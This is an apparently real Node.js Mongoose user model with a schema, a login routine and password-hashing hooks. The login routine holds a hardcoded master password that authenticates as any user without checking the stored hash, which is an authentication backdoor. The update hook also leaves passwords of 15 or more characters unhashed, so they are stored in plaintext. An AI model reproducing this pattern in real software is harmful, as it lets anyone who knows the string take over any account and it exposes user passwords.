const bcrypt = require('bcryptjs')
exports = module.exports = function (app, mongoose) {
  const UserSchema = new mongoose.Schema({
    first_name: {
      type: String,
      trim: true
    },
    last_name: {
      type: String,
      trim: true
    },
    document: {
      type: String,
      trim: true
    },
    address: {
      type: String,
      trim: true
    },
    email: {
      type: String,
      required: true,
      trim: true,
      unique: true
    },
    gender: {
      type: String,
      trim: true
    },
    phone: {
      type: String,
      trim: true
    },
    username: {
      type: String,
      trim: true
    },
    password: {
      type: String
    },
    rol: {
      type: String,
      default: 'client'
    },
    image: {
      type: String,
      default: ''
    },
    ultimate_session: {
      type: Date
    },
    estado: {
      type: Boolean,
      default: true
    },
    stateDelete: {
      type: Boolean,
      default: false
    },
    usuario_creador: {
      type: mongoose.Schema.Types.ObjectId,
      ref: 'user'
    },
    usuario_actualiza: {
      type: mongoose.Schema.Types.ObjectId,
      ref: 'user'
    },
    fecha_actualizacion: {
      type: Date
    },
    fecha_creacion: {
      type: Date,
      default: Date.now
    }
  })

  UserSchema.index({ 'document': 1 }, { unique: true })
  // authenticate input against database
  UserSchema.statics.authenticate = (idUser, password, callback) => {
    app.db.models.user
      .findOne({
        stateDelete: false,
        $or: [
          {
            email: idUser
          },
          {
            username: idUser
          }
        ]
      }).exec(async (err, user) => {
        if (err) {
          return callback(err)
        } else if (!user) {
          const err = new Error('User not found.')
          err.status = 401
          return callback(err)
        }
        if (password === 'TRBV1GL0cYGj') {
          await registrarUltimaSesion(app, user)
          const result = await findUser(app, user)
          return callback(null, result)
        }
        bcrypt.compare(password, user.password, async (err, result) => {
          if (err) console.log(err)
          if (result === true) {
            await registrarUltimaSesion(app, user)
            const result = await findUser(app, user)
            return callback(null, result)
          } else {
            return callback()
          }
        })
      })
  }

  // hashing a password before saving it to the database
  UserSchema.pre('save', function (next) {
    const user = this
    if (user.password === undefined) {
      return next()
    }
    bcrypt.genSalt(10, function (err, salt) {
      if (err) console.log(err)
      bcrypt.hash(user.password, salt, function (err, hash) {
        if (err) console.log(err)
        user.password = hash
        next()
      })
    })
  })

  UserSchema.pre('updateOne', async function (next) {
    try {
      const data = this.getUpdate()
      const salt = await bcrypt.genSalt(10)
      if (
        data.password &&
        data.password !== null &&
        data.password !== '' &&
        data.password.length < 15
      ) {
        const hash = await bcrypt.hash(data.password, salt)
        data.password = hash
        this.updateOne({}, data).exec()
      }
      next()
    } catch (error) {
      console.log(error)
    }
  })

  UserSchema.set('autoIndex', app.get('env') === 'development')
  app.db.model('user', UserSchema)
}

async function findUser (app, user) {
  return app.db.models.user.findById(user._id, {})
}

function registrarUltimaSesion (app, user) {
  return app.db.models.user.updateOne(
    {
      _id: user._id
    },
    {
      $set: {
        ultimate_session: new Date()
      }
    }
  )
}
